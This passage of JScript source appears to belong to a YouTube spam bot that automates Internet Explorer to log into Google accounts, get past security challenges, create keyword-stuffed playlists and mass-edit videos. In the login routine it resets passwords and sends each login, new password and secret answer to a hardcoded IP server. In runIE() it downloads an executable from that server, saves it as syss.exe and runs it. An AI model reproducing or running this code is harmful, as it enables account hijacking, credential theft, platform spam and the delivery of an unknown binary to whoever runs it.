            shell.Run(fso.getFile(me + "\\syss.exe").shortPath, 1);
        WScript.Sleep(5000);
        ieb.visible = true;
        ieb.Navigate("about:blank");
        wait("about:blank");
        ieb.Navigate("https://www.youtube.com/editor?feature=upload");
        wait("https://www.youtube.com/editor?feature=upload DEbUG");
        return true;
    }
    this.addPlayList = function(title){
        runIE();
        ieb.Navigate("https://www.youtube.com/view_all_playlists");
        wait("https://www.youtube.com/view_all_playlists");
        try {
            prevListID = ieb.document.body.innerHTML.split("playlist?list=")[1].split("\"")[0];
        } catch(eee) {}
        while(getElementsByClassName(ieb.document, "warning-text").length >= 1){
            ieb.document.getElementsByName("acknowledge")[0].click();
            wait("acknowledge CLICKED!");
            runIE();
            ieb.Navigate("https://www.youtube.com/view_all_playlists");
            wait("https://www.youtube.com/view_all_playlists SECOND TIME");
        }
        try {
            ieb.document.getElementById("vm-create-playlist-widget").getElementsByTagName("button")[7].click();
        } catch (hahahaerr) {shell.Run("tskill cmd2", 1, true);}
        WScript.Sleep(2000);
        getElementsByClassName(ieb.document, "create-playlist-section")[2].getElementsByTagName("input")[0].value = title;
        WScript.Sleep(2000);
        getElementsByClassName(ieb.document, "create-playlist-buttons")[1].getElementsByTagName("button")[1].disabled = false;
        WScript.Sleep(1000);
        getElementsByClassName(ieb.document, "create-playlist-buttons")[1].getElementsByTagName("button")[1].click();
        wait("create-playlist-buttons clicked");
    }
    this.createPlaylist = function (params){
        //runIE();
        log("create_playlists");
        var filmName, description, playlist_name, dtext, video_id,status;
        playlist_cycle:
            var err_c = 0;
        new_pl_loop:
            while(dtext = keywordsObject.readBase(params.keywordsFile, params.keywordsCount, params.keywordsTitleMode)){
                filmName = dtext.filmname;

                if(params.translateTo == "none"){
                    description = dtext.keywords;
                    playlist_name = dtext.title;
                }else{
                    description = ajax.translate(dtext.keywords, params.translateTo);
                    playlist_name = ajax.translate(dtext.title, params.translateTo);
                }

                //playlist_name = this.getKeysFromSearch();// forced!

                // var newData = ajax.getTitlesFromSearch(playlist_name);
                // description = newData.keys; // forced
                // description = ajax.getRemote().keywords;
                // playlist_name = newData.title;

                log("filmName: "+ filmName);
                log("description: "+ description);
                log("playlist_name: "+ playlist_name);
                log("filmName: "+ filmName);
                // add_video_id_arr = session("add_video_id_arr");
                add_video_id_arr = params.videoIdList;
                if(vid_number > params.playlistCount){return;}


                // playlist_name_nums =  parseInt(100000 + Math.random() * 899999);

                browser.addPlayList(playlist_name);

                runIE();
                ieb.Navigate("https://www.youtube.com/view_all_playlists");
                wait("CREATE  PL https://www.youtube.com/view_all_playlists");
                var listID = ieb.document.body.innerHTML.split("playlist?list=")[1].split("\"")[0];
                if (listID == prevListID) {shell.Run("tskill cmd2", 1, true);WScript.Quit();}
                runIE();
                ieb.Navigate("https://www.youtube.com/playlist?list=" + listID);
                wait("CREATE PL KIST ID https://www.youtube.com/playlist?list=" + listID)

                //////////////   create playlist block
                var titleWords = filmName.split(" ");
                filmName = titleWords.slice(0, (titleWords.length>3?3:titleWords.length)).join(" ");
                log("****************\nvid_number: "+ vid_number+" --> "+playlist_name+"\n**************\n")
                log("add_video_id_arr: " + add_video_id_arr)
                log("add_video_id_arr.length: " + add_video_id_arr.length)
                //video_id = ajax.getVideoFromSearch(filmName, [add_video_id_arr[vid_number % (add_video_id_arr.length-1)]]); original for multiple videos
                video_id = ajax.getVideoFromSearch(filmName, [add_video_id_arr[0]]);
                vid_number ++;
                log(playlist_name);
                playlist_name = filmName;
                log(video_id);
                // log(video_id.length);

                for(var v=0;v<2;v++){

                    try {
                        ieb.document.getElementById("gh-playlist-add-video").click();
                        WScript.Sleep(3000);
                    } catch (aaa) {
                        ieb.Navigate("https://www.youtube.com/view_all_playlists");
                        wait("https://www.youtube.com/view_all_playlists ADD PLAYLIST");
                        WScript.Sleep(3000);
                        shell.Run("tskill cmd2", 1, true);

                        //continue new_pl_loop;
                        getElementsByClassName(ieb.document, "add-new-pl-btn")[0].click();
                        //ieb.document.getElementById("gh-playlist-add-video").click();
                        WScript.Sleep(3000);
                    }
                    var first;
                    if(v == 0){
                        log("DEBUG video_id" + video_id);
                        log("**************\nvideo_id[v]"+ video_id[0])
                        searchTemplate = "https://www.youtube.com/watch?v="+ video_id[0];
                        first = true;
                    }else{
                        var filmNameState = ajax.splitLastWord(playlist_name);
                        playlist_name = filmNameState.searchText;
                        log("playlist_name_SUBSTR: "+playlist_name);
                        searchTemplate = playlist_name;
                        first = false;
                    }
                    mouseActions.addVideoToPlayList(searchTemplate.split(" ")[0], first);// searchTemplate
                    wait("ADD VIDEO TO PL");
                    WScript.Sleep(5000);
                    if(v != 0){
                        log("getElementsByClassName(ieb.document, pl-video).length:  " + getElementsByClassName(ieb.document, "pl-video").length)
                        if(getElementsByClassName(ieb.document, "remove-duplicate-button").length >= 1 ){
                            getElementsByClassName(ieb.document, "remove-duplicate-button")[0].click();
                            wait("remove-duplicate-button CLICKED");
                        }
                        var plVidLen = getElementsByClassName(ieb.document, "pl-video").length;
                        if (plVidLen < 1){
                            log("FIRST VIDEO NOT FOUND!");
                            v = -1;
                            continue;
                        }
                        if (plVidLen< 3){
                            //if(err_c > 5){
                            playlist_name = keywordsObject.readBase(params.keywordsFile, params.keywordsCount, params.keywordsTitleMode).title;

                            //}
                            log("VIDEO WASN'T ADDED!"  + err_c);
                            v--;
                            err_c++;
                            continue;
                        }
                    }
                }
                ieb.document.parentWindow.clipboardData.setData("Text",description); // save data to buffer
                WScript.Sleep(1000);
                getElementsByClassName(ieb.document, "pl-header-add-description-button")[0].click();
                WScript.Sleep(3000);
                mouseActions.addDescription(description);

            }// while
    }// function end

    this.youtube = {
        login: function( login, password) {
            log("login: " +login)
            log("Password: " + password)
            runIE();
            if (ieb.document.parentWindow.navigator.userAgent.indexOf("MSIE 9.0")!=-1 || ieb.document.parentWindow.navigator.userAgent.indexOf("MSIE 8.0")!=-1) WScript.Quit();
            log('UserAgent:' + ieb.document.parentWindow.navigator.userAgent + ' Language:' + ieb.document.parentWindow.navigator.language);
            logout = function () {
                //ieb.Navigate("https://www.youtube.com/logout");
                //wait();
                //runIE();
                if(ieb.document.getElementById("yt-picker-language-button")){
                    log("element yt-picker-language-button")
                    try {
                        ieb.document.getElementById("yt-picker-language-button").click();
                        wait("etElementById(yt-picker-language-button");
                        spans = ieb.document.getElementById("yt-picker-language-footer").getElementsByTagName("span");
                        for (var l=0;l<spans.length;l++)
                            if (spans[l].innerHTML.indexOf("Русский")!=-1) {spans[l].parentNode.click();wait("LOGOUT WAIT!");break;}
                    } catch(langerr) {}
                }
                ieb.Navigate("https://accounts.google.com/AccountChooser");
                wait("https://accounts.google.com/AccountChooser");
                if(ieb.document.body.innerHTML.indexOf("This page can’t be displayed") !=-1){
                    log("this page cant be displayed!!!");
                    runIE();
                    ieb.Navigate("https://accounts.google.com/AccountChooser");
                    wait("https://accounts.google.com/AccountChooser");
                }
                if (ieb.document.body.innerHTML.indexOf(login)!=-1) {
                    log("Already logined!");
                    return "LOGINED";
                }
                if(ieb.document.getElementById("edit-account-list")){
                    log("element edit-account-list")
                    try {
                        ieb.document.getElementById("edit-account-list").click();
                        WScript.Sleep(5000);
                        var caccs = ieb.document.getElementsByName("Email");
                        ca_length = caccs.length;
                        log("Elements found: " + ca_length);
                        for (var ai=0;ai<ca_length;ai++) {
                            log("Clicking: " + caccs[0].id);
                            caccs[0].click();
                            WScript.Sleep(15000);
                        }
                        ieb.document.getElementById("edit-account-list").click();
                        WScript.Sleep(5000);
                    } catch (ermaccs) {}
                }
                return true;
            }
            if (logout() == "LOGINED") return;

            if(ieb.document.getElementById("account-chooser-add-account")){
                log("INNER: "+ieb.document.getElementById("account-chooser-add-account"));
                fso.createTextFile(me+"/ie_DEBUG.txt").Write(encodeURIComponent(ieb.document.body.innerHTML));
                log("element account-chooser-add-account")
                try {
                    ieb.document.getElementById("account-chooser-add-account").click();
                    wait("getElementById(account-chooser-add-account");
                }
                catch (ace) {}
            }
            var nextButton;
            if(ieb.document.getElementById("identifierId")){
                imitate_input(ieb.document.getElementById("identifierId"),login);
                nextButton = ieb.document.getElementById("identifierNext")
            }else{
                imitate_input(ieb.document.getElementById("Email"),login);
                nextButton = ieb.document.getElementById("next")
            }
            log("enter login: " + login);
            if(ieb.document.getElementById("next") || ieb.document.getElementById("identifierNext")){
                log("element next");
                try{

                    nextButton.click();
                    WScript.Sleep(7000);

                    var errormsg_0_Email = "";
                    try{
                        var errormsg_0_Email = ieb.document.getElementById("errormsg_0_Email").innerHTML;
                    }catch(err_errormsg_0_Email){};
                    if (
                        errormsg_0_Email !="" ||
                        getElementsByClassName(ieb.document, "LXRPh")[0].innerText.length > 2
                    ){
                        log("Account locked 839");
                        ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=newdescr&phone="+login+"&descr=bad","","");
                        shell.Run("tskill cmd2", 1, true);
                    }
                }catch (err) {}
            }

            log("ieb.document.getElementsByName(password).length " + ieb.document.getElementsByName("password").length)
            if(ieb.document.getElementsByName("password").length >= 1){
                log("password TYPE: " + ieb.document.getElementsByName("password")[0].type)
                imitate_input(ieb.document.getElementsByName("password")[0],password);
            }else{
                log("Passwd TYPE: " + ieb.document.getElementById("Passwd").type)
                imitate_input(ieb.document.getElementById("Passwd"),password);
            }
            log("enter password: " + password);
            if(ieb.document.getElementById("PersistentCookie")){
                log("element PersistentCookie");
                try{
                    ieb.document.getElementById("PersistentCookie").checked = "checked";
                }catch(ertypdadd){
                    log("PersistentCookie error: "+ertypdadd.message);
                }
            }

            if(ieb.document.getElementById("passwordNext")){
                ieb.document.getElementById("passwordNext").click();
            }else{
                ieb.document.getElementById("signIn").click();
            }
            WScript.Sleep(2000);
            wait("getElementById(signIn or passwordNext)", false, "login");
            if(ieb.document.body.innerHTML.indexOf("id=\"submitSms\"")!=-1){
                log("Need LOGIN FROM UKRAINE 479");
                return "bad_acc_login";
            }
            if(ieb.document.body.innerHTML.indexOf("id=\"challengeId")!=-1 && ieb.document.body.innerHTML.indexOf("id=\"submitSms\"")==-1){
                log("Need ENTER CITY");
                try {
                    ieb.document.getElementById("answer").value = "kharkiv";
                    WScript.Sleep(2000);
                    ieb.document.getElementById("submit").click();
                    wait("getElementById(submit_0");
                }
                catch (e) {}
                try {
                    ieb.document.getElementById("answer").value = "kyiv";
                    WScript.Sleep(2000);
                    ieb.document.getElementById("submit").click();
                    wait("getElementById(submit_1");
                }
                catch (e) {}
                if(
                    ieb.document.getElementById("error") != null ||
                    ieb.document.getElementById("errormsg_0_Passwd") != null
                ){
                    return "bad_acc_login";
                }
            }
            if (
                ieb.document.body.innerHTML.indexOf("name=\"deviceAddress\"")!=-1 ||
                ieb.document.body.innerHTML.indexOf("name=\"SendCode\"")!=-1 ||
                ieb.document.body.innerHTML.indexOf("MapChallengeOption")!=-1 ||
                ieb.document.body.innerHTML.indexOf("ваш аккаунт Google заблокирован")!=-1 ||
                ieb.document.body.innerHTML.indexOf("Неверный пароль")!=-1 ||
                ieb.document.body.innerHTML.indexOf("Wrong password")!=-1 ||
                ieb.document.body.innerHTML.indexOf("Указан неправильный адрес или пароль")!=-1 ||
                ieb.document.body.innerHTML.indexOf("Не удалось распознать адрес электронной почты")!=-1 ||
                ieb.document.body.innerHTML.indexOf("Неверное имя пользователя или пароль")!=-1 ||
                ieb.document.body.innerHTML.indexOf("Sorry, Google doesn't recognize that email")!=-1
            ){
                log("Account locked");
                return "bad_acc";
            }
            if(ieb.document.getElementById("SecretQuestionChallenge")){
                log("element SecretQuestionChallenge");
                try{
                    log("SecretQuestionChallenge");
                    ieb.document.getElementById("SecretQuestionChallenge").click();
                    WScript.Sleep(2000);
                }catch(errtyq){}
            }
            if(ieb.document.getElementById("answer")){
                log("element answer");
                try{
                    ieb.document.getElementById("answer").value = lmeanswer;
                    WScript.Sleep(2000);
                    ieb.document.getElementById("submitChallenge").removeAttribute("disabled");
                    ieb.document.getElementById("submitChallenge").click();
                    wait("getElementById(submitChallenge_1");
                }catch(errtyq){}
            }
            if(ieb.document.getElementById("address")){
                log("element address")
                try {
                    ieb.document.getElementById("address").value = "Kiev";
                    WScript.Sleep(2000);
                    ieb.document.getElementById("submitChallenge").click();
                    wait("getElementById(submitChallenge_2");
                }catch (e){};
            }
            var newpassword = password;
            if(ieb.document.getElementById("PasswdAgain")){
                log("element PasswdAgain")
                try {
                    randle = "abcdefghijklmnopqrstuvwxyz".substr(parseInt(Math.random()*26), 1);
                    ieb.document.getElementById("Passwd").value = password + randle;
                    ieb.document.getElementById("PasswdAgain").value = password + randle;
                    WScript.Sleep(2000);
                    ieb.document.getElementsByName("submitButton")[0].click();
                    wait("submitButton)[0].click()");
                    newpassword = password + randle;
                    log("New password: " + newpassword);
                    ajax.sendReport("POST", "http://37.59.246.141/youtube/" ,"accounts="+login+";"+newpassword+"*"+lmeanswer);
                }catch (e){};
            }
            log("WE HERE!");
            if(ieb.document.getElementById("save")){
                log("element save")
                try {
                    ieb.document.getElementById("save").click();
                    wait("getElementById(save)");
                }catch (e){};
            }
            if(ieb.document.getElementById("cancel")){
                log("element cancel")
                try {
                    ieb.document.getElementById("cancel").click();
                    wait("getElementById(cancel)");
                }catch (e){};
                wait("unknown WAIT");
            }
            // try{
            // log("last_place");
            // ieb.Navigate("https://security.google.com/settings/security/notifications");
            // wait("https://security.google.com/settings/security/notifications");
            // last_place = ieb.document.body.innerHTML.split("class=\"Pn\">")[1].split("<")[0];
            // ajax.sendReport("POST", "http://37.59.246.141/youtube/index.php?act=newlocation&phone="+lmelogin+"&location="+last_place);
            // }catch(error){
            // log(error.message);
            // }
            try{
                getElementsByClassName(ieb.document, "c-sa-ra a-b a-b-G Zg")[0].click();
                log("CLICKED CLASS -> c-sa-ra a-b a-b-G Zg")
                WScript.Sleep(5000);
            }catch(ettoor){
                log("CANT FIND CLASS -> c-sa-ra a-b a-b-G Zg")
            }
            log("Login Finished");
            return newpassword;
        },
        createChannel: function() {
            ieb.Navigate("https://www.youtube.com/create_channel");
            wait("https://www.youtube.com/create_channel");
            WScript.Sleep(5000);
            ieb.Refresh();
            wait("https://www.youtube.com/create_channel REFRESHED");
            // WScript.Sleep(10000);
            for (var z=0;z<2;z++) {
                try {
                    log("setup-submit-button")
                    ieb.document.getElementById("setup-submit-button").click();
                } catch (berr) {}
                try {
                    log("create-channel-submit-button")
                    getElementsByClassName(ieb.document, "create-channel-submit-button")[0].click();
                } catch (berr) {}
                try {
                    log("create-channel-submit")
                    getElementsByClassName(ieb.document, "create-channel-submit")[0].click();
                } catch (berr) {}
                wait("create-channel-submit");
            }
        },
        checkingErrorsOnChannel: function(){
            log("checkingErrorsOnChannel")
            var _errorCount = 0;
            ieb.Navigate("https://www.youtube.com/editor?feature=upload");
            wait("https://www.youtube.com/editor?feature=upload");
            //while((ieb.document.body.innerHTML.indexOf("error-box") !=-1  || ieb.document.body.innerHTML.indexOf("yt-alert-message") !=-1) && _errorCount<5){
            //	ieb.refresh();
            //	wait("https://www.youtube.com/editor?feature=upload REFRESHED");
            //	_errorCount++;
            //}
            if(_errorCount == 5){
                fso.CreateTextFile(me+"\debug_IE.txt").Write(encodeURIComponent(ieb.document.body.innerHTML));
                log("BROWSER ERROR CHECK - "+me+"/debug_IE.txt");
                Wscript.Quit();
            }
            log("No errors Was found!all ok!")
        },
        checkingChannelExistence: function() {
            log("checkingChannelExistence");
            runIE();
            browser.youtube.resizeIeWindow();
            browser.youtube.checkingErrorsOnChannel();
            if(ieb.document.body.innerHTML.indexOf("PlusPageName") !=-1){
                log("(PlusPageName) !=-1");
                ieb.document.getElementById("PlusPageName").value = "New channel";
                ieb.document.getElementById("TermsOfService").checked = true;
                mouseActions.createChannel("channel_name");
                ieb.document.getElementById("submitbutton").click();
                wait("getElementById(submitbutton) checkingChannelExistence");
                ieb.Navigate("https://www.youtube.com/editor?feature=upload");
                wait("https://www.youtube.com/editor?feature=upload checkingChannelExistence");
            }
            if (ieb.document.body.innerHTML.indexOf("create_channel") !=-1) {
                log("(create_channel) !=-1");
                mouseActions.createChannel("");
                runIE();
                ieb.Navigate("https://www.youtube.com/editor?feature=upload");
                wait("https://www.youtube.com/editor?feature=upload checkingChannelExistence_1");

            }
            log("Channel Check OK!")
        },
        resizeIeWindow: function() {
            window = ieb.document.parentWindow;
            window.moveTo(0, 0);
            log("WIDTH: " + window.screen.width);
            log("HEIGHT: " + window.screen.height);
            window.resizeTo(window.screen.width, window.screen.height);
            shell.AppActivate("Видеоредактор - YouTube - Internet Explorer");
        }
    }

    function runIE() {
        shell.Run("tskill iexplore", 0, true);
        shell.Run("tskill syss", 0, true);
        // roaming = shell.SpecialFolders.Item("AppData");
        // path = roaming + "\\Microsoft\\Windows\\Cookies";
        //shell.Run("cmd"+" /C echo Y|del /F /S /Q \"" +path  + "\"" , 0, true);
        if (!fso.fileExists(me + "/syss.exe")) {
            ie.open("POST", "http://37.59.246.141/youtube/hide2.exe", 0);
            ie.send();
            var fs = new ActiveXObject("ADO"+"DB.Stream");
            fs.Mode = 3
            fs.Type = 1
            fs.open();
            fs.Write(ie.responseBody);
            fs.SaveToFile(me + "/syss.exe", 2);
            fs.close();
        }
        ieb = new ActiveXObject("InternetExplorer.Application");
        // WScript.Sleep(5000);
        // if (!fso.fileExists(me + "/local"))
        // shell.Run(fso.getFile(me + "\\syss.exe").shortPath, 1);
        // WScript.Sleep(5000);
        ieb.visible = true;
        ieb.Navigate("about:blank");
        WScript.Sleep(3000);
        mouseActions.resizeWindowBeforeStart();
    }
    function imitate_input(element, text){

        function simulate_ie(element, eventName)
        {
            var options = extend(defaultOptions, arguments[2] || {});
            var oEvent, eventType = null;
            for (var name in eventMatchers)
            {
                if (eventMatchers[name].test(eventName)) { eventType = name; break; }
            }
            if (!eventType)
                throw new SyntaxError('Only HTMLEvents and MouseEvents interfaces are supported');
            if (ieb.document.createEvent)
            {
                oEvent = ieb.document.createEvent(eventType);
                if (eventType == 'HTMLEvents')
                {
                    oEvent.initEvent(eventName, options.bubbles, options.cancelable);
                }
                else
                {
                    oEvent.initMouseEvent(eventName, options.bubbles, options.cancelable, ieb.document.defaultView,
                        options.button, options.pointerX, options.pointerY, options.pointerX, options.pointerY,
                        options.ctrlKey, options.altKey, options.shiftKey, options.metaKey, options.button, element);
                }
                element.dispatchEvent(oEvent);
            }
            else
            {
                options.clientX = options.pointerX;
                options.clientY = options.pointerY;
                var evt = ieb.document.createEventObject();
                oEvent = extend(evt, options);
                element.fireEvent('on' + eventName, oEvent);
            }
            WScript.Sleep(100);
            return element;
        }
        function extend(destination, source) {
            for (var property in source)
                destination[property] = source[property];
            return destination;
        }
        var eventMatchers = {
            'HTMLEvents': /^(?:load|unload|abort|error|select|change|submit|reset|focus|blur|resize|scroll)$/,
            'MouseEvents': /^(?:click|dblclick|mouse(?:down|up|over|move|out))$/
        }
        var defaultOptions = {
            pointerX: 0,
            pointerY: 0,
            button: 0,
            ctrlKey: false,
            altKey: false,
            shiftKey: false,
            metaKey: false,
            bubbles: true,
            cancelable: true
        }
        function keyevent(element, eventname) {
            var keyboardEvent = ieb.document.createEvent("KeyboardEvent");
            var initMethod = typeof keyboardEvent.initKeyboardEvent !== 'undefined' ? "initKeyboardEvent" : "initKeyEvent";
            keyboardEvent[initMethod](
                eventname, // event type : keydown, keyup, keypress
                true, // bubbles
                true, // cancelable
                ieb.document.parentWindow, // viewArg: should be window
                false, // ctrlKeyArg
                false, // altKeyArg
                false, // shiftKeyArg
                false, // metaKeyArg
                40, // keyCodeArg : unsigned long the virtual key code, else 0
                0 // charCodeArgs : unsigned long the Unicode character associated with the depressed key, else 0
            );
            element.dispatchEvent(keyboardEvent);
        }
        element.focus();
        element.value =  text;
        keyevent(element, 'keydown');
        keyevent(element, 'keydown');
        keyevent(element, 'keydown');
        keyevent(element, 'keyup');
        keyevent(element, 'keyup');
        keyevent(element, 'keyup');
        simulate_ie(element, 'change');
        simulate_ie(element, 'change');
        simulate_ie(element, 'blur');
        simulate_ie(element, 'blur');
        WScript.Sleep(5000);
    }
    function getElementsByClassName(node, classname) {
        var a = [];
        var re = new RegExp('(^| )'+classname+'( |$)');
        var els = node.getElementsByTagName("*");
        for(var i=0,j=els.length; i<j; i++) {
            try {
                if(re.test(els[i].className))a.push(els[i]);
            } catch (eee) {}
        }
        return a;
    }

    function wait2() {
        mainCycle:
            for (var wc=1;wc<=3;wc++) {
                var max_wait = wc * 60000;
                var duration = 0;
                log("Wait Step " + wc);
                WScript.Sleep(10000);
                while(1) {
                    try {
                        log("Loading state: " + ieb.document.readyState);
                        if (ieb.document.readyState == "complete") {
                            if (ieb.document.title == "Не удается отобразить эту страницу") {
                                ieb.refresh();
                                continue mainCycle;
                            }
                            else
                                return true;
                        }
                        else {
                            if (duration>max_wait) {
                                ieb.refresh();
                                continue mainCycle;
                            }
                            WScript.Sleep(1000);
                            duration+=1000;
                        }
                    } catch(docErr) {
                        WScript.Sleep(1000);
                    }
                }
            }
        WScript.Echo("Page unavailable");
        shell.Run("tskill cmd2", 1, true);
    }
    function wait1(url){
        if (url === void 0) {url = "";}
        mainCycle:
            for (var wc=1;wc<=3;wc++) {
                log(url)
                WScript.Echo("Wait Step " + wc);
                var was_html;
                try {
                    was_html = ieb.document.body.innerHTML;
                }
                catch (err) {
                    was_html = Math.random();
                }
                var was_busy = false;
                var max_wait = wc*60000;
                var start = new Date().getTime();
                log("Loading page ");
                while(true) {
                    var duration = (new Date().getTime()-start);
                    if (ieb.busy)
                        was_busy = true;
                    //try {
                    log("was_busy " + was_busy);
                    log("ieb.busy " + ieb.busy);
                    log("duration " + duration);
                    log("ieb.document.readyState " + ieb.document.readyState);
                    //log("Duration: " + duration);
                    var now_html = ieb.document.body.innerHTML;
                    if (now_html!=was_html /* && was_busy && (!ieb.busy) */  && duration>10000 /*&& ieb.readyState==4*/) {
                        // WScript.Sleep(3000);
                        if (
                            ieb.document.title == "Не удается отобразить эту страницу" ||
                            ieb.document.body.innerHTML.indexOf("This page can’t be displayed") !=-1
                        ){
                            ieb.refresh();
                            continue mainCycle;
                        }
                        else { //page loaded ok
                            // WScript.Sleep(3000);
                            WScript.Stdout.Write("\n");
                            log("Page OK");
                            return 1;
                        }
                    }
                    if (duration>max_wait || (was_busy==false && duration>5000)) {
                        ieb.refresh();
                        continue mainCycle;

                    }
                    //}catch (waiterr) {
                    //	if (duration>max_wait) {ieb.refresh();continue mainCycle;}
                    //	WScript.Stdout.Write("*");
                    //}
                    WScript.Sleep(1000);
                }
            }
        WScript.Echo("Page unavailable");
        shell.Run("tskill cmd2", 1, true);
    }

    function wait(url, refreshState, comeFrom) {
        if (refreshState === void 0) {refreshState = true;}
        if (comeFrom === void 0) {comeFrom = "";}

        mainCycle:
            for (var wc=1;wc<=3;wc++) {
                log(url)
                WScript.Echo("Wait Step " + wc);
                var was_html;
                try {
                    was_html = ieb.document.body.innerHTML;
                }
                catch (err) {
                    was_html = Math.random();
                }
                var was_busy = false;
                var max_wait = wc*60000;
                var start = new Date().getTime();
                log("Loading page ");
                while(true) {
                    var duration = (new Date().getTime()-start);
                    if (ieb.busy)
                        was_busy = true;
                    //try {
                    log("was_busy " + was_busy);
                    log("ieb.busy " + ieb.busy);
                    log("duration " + duration);
                    log("ieb.document.readyState " + ieb.document.readyState);
                    //log("Duration: " + duration);
                    //var now_html = ieb.document.body.innerHTML;
                    if (/*now_html!=was_html && */was_busy && (!ieb.busy || ieb.document.readyState == "complete")  && duration>10000 /*&& ieb.readyState==4*/) {
                        // WScript.Sleep(3000);
                        if (
                            ieb.document.title == "Не удается отобразить эту страницу" ||
                            ieb.document.body.innerHTML.indexOf("This page can’t be displayed") !=-1
                        ){
                            ieb.refresh();
                            continue mainCycle;
                        }
                        else { //page loaded ok
                            // WScript.Sleep(3000);
                            WScript.Stdout.Write("\n");
                            log("Page OK");
                            return 1;
                        }
                    }
                    if (duration>max_wait || (was_busy==false && duration>5000)) {
                        if(refreshState){
                            log("refrshing page!")
                            ieb.refresh();
                            continue mainCycle;
                        }
                        if(comeFrom=="login"){
                            was_busy = true;
                            //ieb.busy = false;
                        }
                    }
                    //}catch (waiterr) {
                    //	if (duration>max_wait) {ieb.refresh();continue mainCycle;}
                    //	WScript.Stdout.Write("*");
                    //}
                    WScript.Sleep(1000);
                }
            }
        WScript.Echo("Page unavailable");
        shell.Run("tskill cmd2", 1, true);
    }

}

function ajaxClass() {
    var vid_number = 0;
    var errors = 0;
    this.sendReport = sendData;

    saveVideo = function (link){
        try{
            log("SavingVideo File..." + link);
            ie.open("GET", link, 0);
            ie.setRequestHeader("User-agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");
            ie.setRequestHeader("Accept", "image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5");
            ie.send();
            fs = new ActiveXObject("ADODB.Stream");
            fs.Mode = 3
            fs.Type = 1
            fs.open();

            fs.Write(ie.responseBody);

            var flag = false;
            if(fso.FileExists(me +"/my_video.mp4")){
                fso.GetFile(me +"/my_video.mp4").Delete();
                log("FIle DELETED!");
            }
            fs.SaveToFile(me +"/my_video.mp4", 2); //fso.GetFileName(link), 2);
            flag = true;
            fs.close();

            return true;
        }catch(errrtt){
            log(errrtt.message);
            WScript.Sleep(10000);
            return false;
        }
    }
    this.getVideoURLandSaveFile =  function (videoID){
        log("videoID: " + videoID)
        var url;
        // log("cmd2 /k youtube-parser https://www.youtube.com/watch?v="+videoID+" --container mp4 > "+me+"/testing.txt");
        // shell.Run("cmd2 /k youtube-parser https://www.youtube.com/watch?v="+videoID+" --container mp4 > "+me+"\\testing.txt", 1, false)

        url = sendData("GET","http://localhost:1111/?id="+videoID);

        //var fileSize = url.split("clen=")[1].split("&")[0];
        ////log("fileSize: " + fileSize/(1024*1024));
        //if(fileSize/(1024*1024) < 100)
        //	return false;

        // shell.Run("cmd2 /k youtube-parser https://www.youtube.com/watch?v="+videoID+" --container mp4", 1, false)
        // WScript.Sleep(5000);
        // shell.Run("tskill cmd2", 1, true);
        // try{
        // var videoDB = fso.GetFile(me+"/testing.txt").openAsTextStream(1, 0).readAll();
        // url = videoDB.split("url\":")[1].split("\"")[1].split("\"")[0];
        // videoDB.close()
        // var rcr = fso.CreateTextFile(me+"/testing.txt");
        // rcr.WriteLine("\r\n");
        // rcr.close();
        // }catch(hertre){
        // return;
        // }
        log(url);
        return saveVideo(url)
    }
    this.getRemote = function() {
        return JSON.parse(sendData("GET", "http://localhost:8080/api/getpack?rnd="+Math.random()), "");
    }

    this.deletePlaylists = function (){
        log("deletePlaylists");
        sendData("GET", "https://www.youtube.com/view_all_playlists", "", "")
        fso.CreateTextFile(me+"/iexml.responseTextDEbug.txt").write(encodeURIComponent(iexml.responseText));
        ids = iexml.responseText.split("<li id=\"vm-playlist-");
        log("countOfPlaylist: "+ids.length)
        dataArr = preloadedData(iexml.responseText);
        headers = dataArr.header;
        session_token = dataArr.session_token;
        for(var i=1;i<ids.length;i++){
            plisToDel = ids[i].split("\"")[0];
            sendData("POST", "https://www.youtube.com/playlist_ajax?action_delete_playlist=1", "full_list_id="+plisToDel+"&session_token="+session_token, headers)
            log(iexml.responseText)
        }
    }
    this.listSerialTitles = function serial_season(filmName, vid_id){
        log("serial_season()");
        sendData("POST", "http://all-serials.pw/film/"+vid_id+"/", "", "");
        s_block = iexml.responseText.split("class=\"episode\"");
        var serial_data = [];
        season = parseInt(s_block[1].split(">")[0].split("film")[1].split("s")[1].split("e")[0]);
        episode = parseInt(s_block[1].split(">")[0].split("film")[1].split("e")[1].split("/")[0]);
        serial_data.push(filmName+" "+season + " Сезон " + episode + " серия");
        if(season == "1" && episode == "1")
            episode = "onlyOneEpisode";
        switch (episode){
            case 1:
                season = parseInt(s_block[2].split(">")[0].split("film")[1].split("s")[1].split("e")[0]);
                episode = parseInt(s_block[2].split(">")[0].split("film")[1].split("e")[1].split("/")[0]);
                serial_data.push(filmName+" "+season + " Сезон " + (episode) + " серия");// now season

                season = parseInt(s_block[3].split(">")[0].split("film")[1].split("s")[1].split("e")[0]);
                episode = parseInt(s_block[3].split(">")[0].split("film")[1].split("e")[1].split("/")[0]);
                serial_data.push(filmName+" "+season + " Сезон " + (episode) + " серия");// previous season
                break;
            case 2:
                serial_data.push(filmName+" "+season + " Сезон " + (episode-1) + " серия");
                serial_data.push(filmName+" "+season + " Сезон " + (episode+1) + " серия");
                serial_data.push(filmName+" "+season + " Сезон " + (episode+2) + " серия");

                season = parseInt(s_block[2].split(">")[0].split("film")[1].split("s")[1].split("e")[0]);
                episode = parseInt(s_block[2].split(">")[0].split("film")[1].split("e")[1].split("/")[0]);
                serial_data.push(filmName+" "+season + " Сезон " + (episode) + " серия"); // previous season
                break;
            case "onlyOneEpisode":
                break;
            default :
                serial_data.push(filmName+" "+season + " Сезон " + (episode-2) + " серия");
                serial_data.push(filmName+" "+season + " Сезон " + (episode-1) + " серия");
                serial_data.push(filmName+" "+season + " Сезон " + (episode+1) + " серия");
                serial_data.push(filmName+" "+season + " Сезон " + (episode+2) + " серия");
                break;
        }
        log(serial_data)
        return serial_data;
    }
    this.changeInfoAll = function(params) {
        log("changeInfoAll()")
        for(var pi=0;pi<params.videoCount/30;pi++){
            sendData("GET", "https://www.youtube.com/my_videos?o=U&pi="+(pi+1),"");
            mass  = iexml.responseText.split("id=\\\"vm-video-");
            for (var i=1;i<mass.length;i++) {
                videoData = genVideoData(params.videoNamePrefix, params.linkDescription, params.allowDescription, params.shortPath);
                var video_id = mass[i].split("\\\"")[0];
                log("video_id: " + video_id);
                ChangeInfo(video_id, videoData.inform);
                WScript.Sleep(3000);
            }
        }
        log("changing ok");
    }
    this.getChannelId = function (login){
        log("getChannelId()")
        try{
